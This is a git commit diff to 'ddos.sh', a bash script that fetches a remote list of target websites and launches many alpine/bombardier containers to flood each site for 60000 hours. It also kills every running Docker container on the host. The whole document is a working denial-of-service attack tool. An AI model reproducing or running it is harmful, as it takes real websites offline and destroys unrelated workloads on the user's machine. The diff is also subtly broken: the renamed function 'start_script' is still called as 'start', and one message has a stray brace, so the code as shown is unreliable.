19e3eb2c6340efe9e0f755958cb5d066526b729f
koterion <koterion317@gmail.com>
2022-02-27 20:29:02 +0200

    Update default amount

--- ddos.sh
+++ ddos.sh
@@ -1,23 +1,24 @@
 #!/bin/bash
+# shellcheck disable=SC2120
+
+TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
 
 function print_help {
   echo -e "Usage: bash ddos.sh"
   echo -e "--number|-n - number of containers to start"
 }
 
-TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
-amount=300
-
-docker kill $(docker ps -q)
-curl --silent $TARGETS_URL --output targets.txt
-
-# shellcheck disable=SC2120
-function start {
-  echo -e "Number of containers: $amount"
+function start_script {
+  if [ -z "$amount" ]; then
+      amount=300
+      echo "Amount of containers not set, setting to $amount}"
+  else
+    echo "Number of containers: $amount"
+  fi
 
   while read -r site_url; do
-      if [ ! -z $site_url ]; then
-          echo -e "Site: $site_url"
+      if [ -n "$site_url" ]; then
+          echo "Site: $site_url"
           if [ -n "$1" ]; then
               docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60000h -l $site_url
           else
@@ -42,4 +43,6 @@ while test -n "$1"; do
   shift
 done
 
+curl --silent $TARGETS_URL --output targets.txt
+docker kill $(docker ps -q)
 start
